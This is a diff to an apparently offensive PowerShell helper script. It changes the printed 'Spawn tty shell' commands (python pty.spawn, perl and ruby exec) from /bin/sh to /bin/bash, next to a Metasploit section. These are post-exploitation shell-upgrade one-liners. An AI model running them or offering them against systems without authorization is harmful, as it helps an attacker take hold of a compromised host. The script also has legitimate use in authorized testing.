@@ -280,11 +280,11 @@ if ($xterm -eq $true) {$r_xterm = $r_xterm -replace " ","%20" -replace "$", "%24
 
 ################################################################################ Spawn tty shell ################################################################################
 
-if ($python3 -eq $true ) {Write-Host "[" -ForegroundColor Green -NoNewline ; Write-Host "+" -NoNewline -ForegroundColor red ;Write-Host "]" -ForegroundColor Green -NoNewline; Write-Host "Spawning a TTY Shell : `n" -ForegroundColor Green ; Write-Host "python3 -c 'import pty; pty.spawn(`"/bin/sh`")'" }
-if ($python -eq $true ) {Write-Host "[" -ForegroundColor Green -NoNewline ; Write-Host "+" -NoNewline -ForegroundColor red ;Write-Host "]" -ForegroundColor Green -NoNewline; Write-Host "Spawning a TTY Shell : `n" -ForegroundColor Green ; Write-Host "python -c 'import pty; pty.spawn(`"/bin/sh`")'" }
+if ($python3 -eq $true ) {Write-Host "[" -ForegroundColor Green -NoNewline ; Write-Host "+" -NoNewline -ForegroundColor red ;Write-Host "]" -ForegroundColor Green -NoNewline; Write-Host "Spawning a TTY Shell : `n" -ForegroundColor Green ; Write-Host "python3 -c 'import pty; pty.spawn(`"/bin/bash`")'" }
+if ($python -eq $true ) {Write-Host "[" -ForegroundColor Green -NoNewline ; Write-Host "+" -NoNewline -ForegroundColor red ;Write-Host "]" -ForegroundColor Green -NoNewline; Write-Host "Spawning a TTY Shell : `n" -ForegroundColor Green ; Write-Host "python -c 'import pty; pty.spawn(`"/bin/bash`")'" }
 if ($bash -eq $true ) {Write-Host "[" -ForegroundColor Green -NoNewline ; Write-Host "+" -NoNewline -ForegroundColor red ;Write-Host "]" -ForegroundColor Green -NoNewline; Write-Host "Spawning a TTY Shell : `n" -ForegroundColor Green ; Write-Host "echo os.system('/bin/bash')" }
-if ($perl -eq $true ) {Write-Host "[" -ForegroundColor Green -NoNewline ; Write-Host "+" -NoNewline -ForegroundColor red ;Write-Host "]" -ForegroundColor Green -NoNewline; Write-Host "Spawning a TTY Shell : `n" -ForegroundColor Green ; Write-Host "perl —e 'exec `"/bin/sh`";'" }
-if ($ruby -eq $true ) {Write-Host "[" -ForegroundColor Green -NoNewline ; Write-Host "+" -NoNewline -ForegroundColor red ;Write-Host "]" -ForegroundColor Green -NoNewline; Write-Host "Spawning a TTY Shell : `n" -ForegroundColor Green ; Write-Host "ruby: exec `"/bin/sh`"" }
+if ($perl -eq $true ) {Write-Host "[" -ForegroundColor Green -NoNewline ; Write-Host "+" -NoNewline -ForegroundColor red ;Write-Host "]" -ForegroundColor Green -NoNewline; Write-Host "Spawning a TTY Shell : `n" -ForegroundColor Green ; Write-Host "perl —e 'exec `"/bin/bash`";'" }
+if ($ruby -eq $true ) {Write-Host "[" -ForegroundColor Green -NoNewline ; Write-Host "+" -NoNewline -ForegroundColor red ;Write-Host "]" -ForegroundColor Green -NoNewline; Write-Host "Spawning a TTY Shell : `n" -ForegroundColor Green ; Write-Host "ruby: exec `"/bin/bash`"" }
 
 
 ################################################################################ Metasploit ################################################################################
@@ -317,11 +317,11 @@ if ($xterm -eq $true) {write-host $r_xterm "`n"}
 
 ################################################################################ Spawn tty shell ################################################################################
 
-if ($python3 -eq $true ) {Write-Host "[" -ForegroundColor Green -NoNewline ; Write-Host "+" -NoNewline -ForegroundColor red ;Write-Host "]" -ForegroundColor Green -NoNewline; Write-Host "Spawning a TTY Shell : `n" -ForegroundColor Green ; Write-Host "python3 -c 'import pty; pty.spawn(`"/bin/sh`")'" }
-if ($python -eq $true ) {Write-Host "[" -ForegroundColor Green -NoNewline ; Write-Host "+" -NoNewline -ForegroundColor red ;Write-Host "]" -ForegroundColor Green -NoNewline; Write-Host "Spawning a TTY Shell : `n" -ForegroundColor Green ; Write-Host "python -c 'import pty; pty.spawn(`"/bin/sh`")'" }
+if ($python3 -eq $true ) {Write-Host "[" -ForegroundColor Green -NoNewline ; Write-Host "+" -NoNewline -ForegroundColor red ;Write-Host "]" -ForegroundColor Green -NoNewline; Write-Host "Spawning a TTY Shell : `n" -ForegroundColor Green ; Write-Host "python3 -c 'import pty; pty.spawn(`"/bin/bash`")'" }
+if ($python -eq $true ) {Write-Host "[" -ForegroundColor Green -NoNewline ; Write-Host "+" -NoNewline -ForegroundColor red ;Write-Host "]" -ForegroundColor Green -NoNewline; Write-Host "Spawning a TTY Shell : `n" -ForegroundColor Green ; Write-Host "python -c 'import pty; pty.spawn(`"/bin/bash`")'" }
 if ($bash -eq $true ) {Write-Host "[" -ForegroundColor Green -NoNewline ; Write-Host "+" -NoNewline -ForegroundColor red ;Write-Host "]" -ForegroundColor Green -NoNewline; Write-Host "Spawning a TTY Shell : `n" -ForegroundColor Green ; Write-Host "echo os.system('/bin/bash')" }
-if ($perl -eq $true ) {Write-Host "[" -ForegroundColor Green -NoNewline ; Write-Host "+" -NoNewline -ForegroundColor red ;Write-Host "]" -ForegroundColor Green -NoNewline; Write-Host "Spawning a TTY Shell : `n" -ForegroundColor Green ; Write-Host "perl —e 'exec `"/bin/sh`";'" }
-if ($ruby -eq $true ) {Write-Host "[" -ForegroundColor Green -NoNewline ; Write-Host "+" -NoNewline -ForegroundColor red ;Write-Host "]" -ForegroundColor Green -NoNewline; Write-Host "Spawning a TTY Shell : `n" -ForegroundColor Green ; Write-Host "ruby: exec `"/bin/sh`"" }
+if ($perl -eq $true ) {Write-Host "[" -ForegroundColor Green -NoNewline ; Write-Host "+" -NoNewline -ForegroundColor red ;Write-Host "]" -ForegroundColor Green -NoNewline; Write-Host "Spawning a TTY Shell : `n" -ForegroundColor Green ; Write-Host "perl —e 'exec `"/bin/bash`";'" }
+if ($ruby -eq $true ) {Write-Host "[" -ForegroundColor Green -NoNewline ; Write-Host "+" -NoNewline -ForegroundColor red ;Write-Host "]" -ForegroundColor Green -NoNewline; Write-Host "Spawning a TTY Shell : `n" -ForegroundColor Green ; Write-Host "ruby: exec `"/bin/bash`"" }
 
 
 ################################################################################ Metasploit ################################################################################
